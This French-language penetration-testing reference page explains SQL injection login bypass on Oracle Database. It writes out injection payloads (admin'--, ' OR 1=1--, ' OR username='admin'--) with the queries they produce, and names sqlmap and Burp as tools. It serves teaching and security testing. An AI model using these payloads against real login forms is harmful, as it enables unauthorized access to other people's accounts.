---
order: 14
title: "Contournement d'authentification via une injection Oracle"
description: "Contourner une authentification dont le SQL est construit à partir des champs nom d'utilisateur et mot de passe dans Oracle Database, via la terminaison par commentaire et des conditions toujours vraies."
keywords:
  - contournement d'authentification
  - contournement de connexion
  - OR 1=1
  - injection par commentaire
  - connexion Oracle
---

# Contournement d'authentification

Une authentification qui interpole les champs soumis, telle que `SELECT * FROM users WHERE username='$u' AND password='$p'`, authentifie sur n'importe quelle ligne renvoyée. Injecter dans l'un ou l'autre champ peut renvoyer la ligne cible sans le bon mot de passe.

Commenter la vérification du mot de passe connecte en tant qu'utilisateur choisi. Le commentaire `--` d'Oracle supprime le reste de la ligne :

```
username: admin'--
query:    SELECT * FROM users WHERE username='admin'-- ' AND password='...'
```

Une condition toujours vraie renvoie une ligne quand aucun compte n'est ciblé. Oracle n'a pas de `LIMIT`, contraignez donc avec `ROWNUM` si l'application attend une seule ligne :

```
username: ' OR 1=1--
query:    SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
```

Lorsque seul le champ mot de passe est injectable et que le nom d'utilisateur est fixe, la terminaison par commentaire ne contourne pas (elle testerait simplement `password='admin'`) ; utilisez une condition qui re-sélectionne la cible afin que le `AND` final soit satisfait par un `OR` :

```
password: ' OR username='admin'--
```

Parce que `AND` lie plus fort que `OR`, cela s'évalue comme `(username='admin' AND password='') OR username='admin'`, renvoyant la ligne admin. Oracle n'autorise pas les requêtes empilées via les pilotes habituels, de sorte qu'une injection de connexion ne peut pas ajouter une seconde instruction, mais le contournement renvoyant une ligne n'a besoin que de la seule requête.

## Outils

- **sqlmap** : confirme et prend l'empreinte du champ de connexion injectable.
- Tests manuels avec Burp Repeater et le client Oracle (sqlplus ou SQLcl).

## Références

- Oracle Database SQL Language Reference : comments, SELECT, conditions
- OWASP Testing Guide : Testing for SQL Injection
